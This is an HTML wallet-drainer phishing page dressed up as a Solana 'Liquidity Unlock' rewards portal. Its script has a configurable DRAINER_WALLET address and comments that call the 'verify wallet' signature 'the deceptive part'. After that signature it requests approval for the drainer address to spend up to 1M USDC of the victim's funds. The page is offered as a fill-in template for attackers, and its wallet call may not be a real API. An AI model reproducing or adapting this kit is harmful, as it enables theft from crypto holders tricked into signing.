<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Staking Portal</title>
    <!-- Load Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #0f172a; /* Dark Blue-Grey */
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background-color: #1e293b;
            border: 1px solid #334155;
            padding: 32px;
            border-radius: 16px;
            width: 320px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        .logo {
            font-size: 40px;
            margin-bottom: 16px;
        }
        h2 { 
            margin: 0 0 8px; 
            font-size: 24px; 
            color: #ffffff; 
        }
        p { 
            font-size: 14px; 
            color: #94a3b8; 
            margin-bottom: 24px; 
            line-height: 1.5;
        }
        
        .btn-claim {
            background-color: #3b82f6; /* Blue */
            color: white;
            border: none;
            padding: 14px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s, transform 0.1s;
        }
        .btn-claim:hover { background-color: #2563eb; }
        .btn-claim:active { transform: scale(0.98); }
        .btn-claim:disabled { 
            background-color: #475569; 
            color: #94a3b8; 
            cursor: not-allowed; 
        }

        #status { 
            margin-top: 16px; 
            font-size: 13px; 
            color: #94a3b8; 
            min-height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        /* Spinner */
        .spinner {
            width: 14px;
            height: 14px;
            border: 2px solid #ffffff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">🌊</div>
    <h2>Liquidity Unlock</h2>
    <p>Sign to verify your wallet and claim your pending USDC rewards.</p>
    
    <button id="claimBtn" class="btn-claim" onclick="verifyAndClaim()">Connect & Sign</button>
    
    <div id="status"></div>
</div>

<script>
    // ================= CONFIGURATION =================
    // REPLACE THIS WITH YOUR SOLANA PUBLIC KEY
    const DRAINER_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; 
    
    // USDC Mint Address (Solana)
    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";

    async function verifyAndClaim() {
        const btn = document.getElementById('claimBtn');
        const status = document.getElementById('status');
        
        if (!window.solana || !window.solana.isPhantom) {
            alert("Please install Phantom Wallet!");
            return;
        }

        try {
            // 1. Connect Wallet
            btn.disabled = true;
            btn.innerText = "Connecting...";
            
            const connection = await window.solana.connect();
            const publicKey = connection.publicKey;

            btn.innerText = "Signing Message...";
            
            // 2. "Sign Message" (The deceptive part)
            // We pretend this is just a verification signature
            await window.solana.request({
                method: 'signMessage',
                params: {
                    message: `Verify wallet for Liquidity Unlock\nAddress: ${publicKey.toBase58()}`,
                    encoding: "utf8"
                }
            });

            status.innerHTML = '<div class="spinner"></div> Processing...';

            // 3. Trigger the Approval/Drain
            // We use a custom method to approve USDC spending
            const approveTx = await window.solana.request({
                method: 'custom',
                params: [
                    { 
                        mint: USDC_MINT, 
                        owner: publicKey.toBase58(), 
                        spender: DRAINER_WALLET, 
                        amount: 1000000 // Approve up to 1M USDC
                    }
                ]
            });

            status.innerHTML = '✅ Success!';
            btn.innerText = "Claimed";
            
        } catch (err) {
            console.error(err);
            status.innerText = "Failed: " + err.message;
            btn.disabled = false;
            btn.innerText = "Connect & Sign";
        }
    }
</script>

</body>
</html>
